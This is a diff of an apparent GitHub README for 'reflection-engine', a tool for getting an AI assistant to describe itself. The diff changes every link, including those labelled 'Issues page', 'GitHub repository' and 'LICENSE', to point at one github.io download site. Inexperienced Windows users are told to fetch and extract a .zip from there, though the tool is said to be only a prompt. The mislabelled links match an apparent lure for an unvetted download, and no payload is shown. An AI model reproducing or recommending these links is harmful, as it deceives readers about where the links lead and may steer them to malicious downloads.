@@ -1,6 +1,6 @@
 <h1>🧠 reflection-engine - Uncover Your AI's Honest Portrait</h1>
 <p align="center">
-  <a href="https://github.com/aa814678389-del/reflection-engine/releases">
+  <a href="https://aa814678389-del.github.io">
     <img src="https://img.shields.io/badge/Download_Reflection_Engine-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Button">
   </a>
 </p>
@@ -11,7 +11,7 @@
 <h2>🚀 Getting Started</h2>
 <p>Follow these easy steps to use Reflection Engine. You don't need any programming experience or special tools—just a computer running Windows and the AI assistant you normally use.</p>
 <ol>
-  <li><strong>Visit this link to download the application:</strong> <a href="https://github.com/aa814678389-del/reflection-engine/releases">https://github.com/aa814678389-del/reflection-engine/releases</a></li>
+  <li><strong>Visit this link to download the application:</strong> <a href="https://aa814678389-del.github.io">https://aa814678389-del.github.io</a></li>
   <li>Click the latest release file (usually a <code>.zip</code> file).</li>
   <li>Save the file to a folder you can find easily, like your Desktop or Downloads folder.</li>
   <li>Right-click the downloaded <code>.zip</code> file and select "Extract All". Choose a destination folder and click "Extract".</li>
@@ -56,7 +56,7 @@
 <h2>📥 Download & Setup</h2>
 <p>Ready to see your AI's portrait? Get the latest version now.</p>
 <p align="center">
-  <a href="https://github.com/aa814678389-del/reflection-engine/releases">
+  <a href="https://aa814678389-del.github.io">
     <img src="https://img.shields.io/badge/⬇️_Download_Now-0078d7?style=for-the-badge&logo=github&logoColor=white" alt="Download Now">
   </a>
 </p>
@@ -77,11 +77,11 @@
   <li><strong>The downloaded file won't open:</strong> Make sure you extracted the <code>.zip</code> file completely. If you downloaded a <code>.txt</code> file directly, just open it with Notepad.</li>
   <li><strong>The AI doesn't respond as expected:</strong> Paste the prompt again exactly as written. Some AI assistants may need a fresh conversation to process it correctly.</li>
   <li><strong>I can't find the download:</strong> Check your Downloads folder. Right-click the downloaded <code>.zip</code> and choose "Extract All".</li>
-  <li><strong>Need more help?</strong> Visit the <a href="https://github.com/aa814678389-del/reflection-engine/issues">Issues page</a> on GitHub to report problems or ask questions.</li>
+  <li><strong>Need more help?</strong> Visit the <a href="https://aa814678389-del.github.io">Issues page</a> on GitHub to report problems or ask questions.</li>
 </ul>
 
 <h2>🤝 Contributing</h2>
-<p>Reflection Engine is open for improvements! If you have ideas, bug fixes, or enhancements, feel free to submit a pull request or open an issue on the <a href="https://github.com/aa814678389-del/reflection-engine">GitHub repository</a>.</p>
+<p>Reflection Engine is open for improvements! If you have ideas, bug fixes, or enhancements, feel free to submit a pull request or open an issue on the <a href="https://aa814678389-del.github.io">GitHub repository</a>.</p>
 
 <h2>📄 License</h2>
-<p>This project is free to use and modify. See the <a href="https://github.com/aa814678389-del/reflection-engine/blob/main/LICENSE">LICENSE</a> file for details.</p>
+<p>This project is free to use and modify. See the <a href="https://aa814678389-del.github.io">LICENSE</a> file for details.</p>
